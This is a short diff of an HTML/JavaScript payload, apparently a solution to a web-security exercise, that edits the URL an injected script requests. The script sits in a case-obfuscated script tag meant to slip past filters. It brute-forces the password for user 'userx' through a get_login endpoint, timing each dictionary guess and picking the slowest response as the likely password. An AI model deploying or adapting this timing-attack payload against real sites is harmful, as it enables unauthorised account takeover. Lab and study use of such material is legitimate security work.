@@ -135,7 +135,7 @@ Here's the nicely-formatted HTML of my answer:
             deltas[index - 1] = end - start;
             start = new Date();
             if (index < dictionary.length) {
-                test.src = `http://${document.location.hostname}:3000/get_login?username=userx&password=${dictionary[index]}`;
+                test.src = `./get_login?username=userx&password=${dictionary[index]}`;
             } else {
                 const imax = deltas.reduce((m, x, i, arr) => m == -1 || x > arr[m] ? i : m, -1);
                 const dsum = deltas.reduce((s, c, i, arr) => s + c, 0);
@@ -144,7 +144,7 @@ Here's the nicely-formatted HTML of my answer:
             index += 1;
         };
         let start = new Date();
-        test.src = `http://${document.location.hostname}:3000/get_login?username=userx&password=${dictionary[0]}`;
+        test.src = `./get_login?username=userx&password=${dictionary[0]}`;
         index += 1;
     </sCrIpT>
 </span>
